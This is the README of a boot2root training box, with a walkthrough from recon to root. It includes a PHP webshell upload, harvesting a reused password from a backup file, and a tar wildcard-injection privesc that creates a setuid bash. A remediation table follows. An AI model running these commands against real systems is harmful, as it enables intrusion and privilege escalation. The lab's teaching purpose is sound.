# Boot2root — Riverside Corp Intranet

A five-stage boot2root: a whole vulnerable "box" (packaged as a Docker
image rather than a full VM, so it's practical to build and ship in a
git repo) that you attack from nothing to a root shell. Two flags, in
the usual boot2root convention:

- `/home/bob/user.txt` — reachable after the lateral-movement stage.
- `/root/root.txt` — reachable only after privilege escalation.

## The chain

```
1. recon            nmap the box -> ports 22 (ssh) and 80 (http) open
2. initial foothold  unrestricted file upload on the web app -> PHP webshell -> RCE as www-data
3. credential theft   local filesystem enumeration finds a leftover config backup with a password
4. lateral movement   that password is reused as a real system account's SSH login (bob)
5. privesc            bob has passwordless sudo on a backup script vulnerable to
                      the classic GTFOBins tar-wildcard injection -> root
```

Every one of these is a real, well-documented class of vulnerability
(unrestricted upload, credential reuse, GTFOBins wildcard injection) —
nothing here is a made-up puzzle mechanic.

## Build & run

```bash
cd boot2root-riverside
docker build -t riverside-b2r .
docker run --rm -d -p 2222:22 -p 8080:80 --name riverside riverside-b2r
# or: docker compose up --build -d
```

The web app is now at `http://localhost:8080/`, SSH at `localhost:2222`.

To automatically replay the entire chain:

```bash
sudo apt-get install -y sshpass   # if you don't already have it
./solve.sh                        # defaults to 127.0.0.1:8080 / :2222
```

`solve.sh` performs exactly the steps below, non-interactively, so you
can use it either to confirm the box is solvable or to see the whole
chain run end to end before trying it by hand.

## Full walkthrough

### 1. Recon

```bash
nmap -sV -p- localhost -Pn
```

Two open ports: `22/tcp` (OpenSSH) and `80/tcp` (Apache/PHP). Visiting
`http://localhost:8080/` shows "Riverside Corp Intranet — Employee Photo
Upload", a single file-upload form.

### 2. Initial foothold — unrestricted file upload

`upload.php` takes whatever file you send it and drops it straight into
`uploads/` under its original filename — no extension allow-list, no
MIME-type check, no rename. Upload PHP instead of a photo:

```bash
echo '<?php system($_GET["c"]); ?>' > shell.php
curl -F "photo=@shell.php" http://localhost:8080/upload.php
```

The response confirms it landed at `uploads/shell.php`. Since Apache
executes any `.php` file it serves, that's a webshell:

```bash
curl "http://localhost:8080/uploads/shell.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

You're now code-executing as `www-data`.

### 3. Credential theft — enumerate the filesystem

Nothing juicy is in the web root itself. Widen the search:

```bash
curl "http://localhost:8080/uploads/shell.php" --get --data-urlencode 'c=find / -iname "*.bak" 2>/dev/null'
# /var/backups/webapp_config.php.bak
```

```bash
curl "http://localhost:8080/uploads/shell.php" --get --data-urlencode 'c=cat /var/backups/webapp_config.php.bak'
```

```php
<?php
// old db config -- replaced 2024-01-15 after the app migration.
// TODO(bob): rotate your own login password too, you reused this one
// as a placeholder when you set your account up and never changed it.
define('DB_HOST', 'localhost');
define('DB_NAME', 'riverside_directory');
define('DB_USER', 'riverside_app');
define('DB_PASS', 'Sp1llway#2024');
?>
```

The comment is the real vulnerability here, not just the password: a
developer reused an app credential as their own personal login and left
a note about it in a file that never should have been left readable.

### 4. Lateral movement — try the password against the real accounts

`find /home -maxdepth 1` (via the same webshell) shows a `bob` account.
Try the leaked password over SSH instead of the app's (nonexistent) DB:

```bash
ssh bob@localhost -p 2222
# password: Sp1llway#2024
```

You're in as `bob`. Grab the first flag:

```bash
cat ~/user.txt
# flag{us3r_cr3ds_h1d1ng_1n_a_.bak_f1l3}
```

### 5. Privilege escalation — GTFOBins tar wildcard injection

Check what bob can run as root:

```bash
sudo -l
# (root) NOPASSWD: /opt/scripts/log_cleanup.sh
```

```bash
cat /opt/scripts/log_cleanup.sh
```

```bash
#!/bin/bash
cd /home/bob/app_logs || exit 1
tar -czf /root/backups/app_logs_$(date +%s).tar.gz *
```

The bug: `*` is expanded by the *shell*, not by `tar`, before `tar` ever
runs — and it's expanded inside a directory bob fully owns
(`~/app_logs`). If bob creates files there whose names are themselves
valid `tar` options, they get passed to `tar` as literal arguments.
`tar` has a `--checkpoint-action` option that can run an arbitrary
command during a checkpoint — this is the well-known
[GTFOBins tar wildcard injection](https://gtfobins.github.io/gtfobins/tar/#shell)
technique:

```bash
cd ~/app_logs
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
sudo /opt/scripts/log_cleanup.sh
```

`log_cleanup.sh` runs as root (via sudo), so when its `tar *` command
expands to include `--checkpoint=1` and `--checkpoint-action=exec=sh
shell.sh`, tar obeys them *as root* and runs `shell.sh` as root too —
which drops a setuid copy of bash:

```bash
/tmp/rootbash -p
whoami
# root
cat /root/root.txt
# flag{w1ldc4rd_t4r_g0t_m3_r00t}
```

Box rooted.

## Why each stage works, and the real fix

| Stage | Root cause | Fix |
|---|---|---|
| Upload -> RCE | No server-side validation of uploaded file type/extension; uploads served from a directory where PHP execution is allowed. | Allow-list extensions/MIME types server-side (never trust the client), store uploads outside the web root or serve them from a location with PHP execution disabled (`php_admin_flag engine off`), and rename uploads to non-attacker-controlled names. |
| Credential theft | A stale backup file left in a world-readable location outside version control, containing a live secret. | Never leave editor/backup artifacts (`.bak`, `.old`, `~`) on a production filesystem; secrets belong in a vault or environment variables, not committed config files, even "temporary" ones. |
| Lateral movement | Password reuse between an application/service credential and a real human user's login. | Every credential should be unique and scoped to one purpose; enforce this with a password manager/vault policy, and rotate immediately if a secret is ever suspected to have been exposed. |
| Privesc | A sudo-granted script uses an unquoted shell wildcard with a command (`tar`) that has command-execution side effects triggerable through crafted filenames. | Avoid wildcards in scripts that run with elevated privileges; if unavoidable, use `tar -- ./*` (so filenames starting with `-` can't be parsed as options) or an explicit file list. More generally: audit every `sudoers` `NOPASSWD` entry against [GTFOBins](https://gtfobins.github.io/) for the binary it invokes — `tar`, `find`, `less`, `vim`, `awk`, and many other common tools have well-known privesc primitives when run with elevated privileges under attacker-influenced arguments or working directories. |

Fixing any *one* of these four stages breaks the whole chain — that's
the point of walking through all of them rather than stopping at the
first shell.

## Files

| File                          | Purpose                                                          |
|-------------------------------|--------------------------------------------------------------------|
| `Dockerfile`                  | Builds the target: Apache+PHP, sshd, `bob`'s account, the vulnerable script, both flags. |
| `docker-compose.yml`          | Convenience wrapper (`docker compose up --build -d`).              |
| `webapp/index.php`            | The upload form.                                                    |
| `webapp/upload.php`           | The vulnerable, unrestricted upload handler.                        |
| `backup/webapp_config.php.bak`| The leaked-credential file, installed outside the web root.         |
| `scripts/log_cleanup.sh`      | The sudo-invokable script with the tar wildcard bug.                |
| `entrypoint.sh`                | Starts apache2 + sshd in the container.                             |
| `solve.sh`                    | Automated, non-interactive replay of the entire walkthrough above.  |
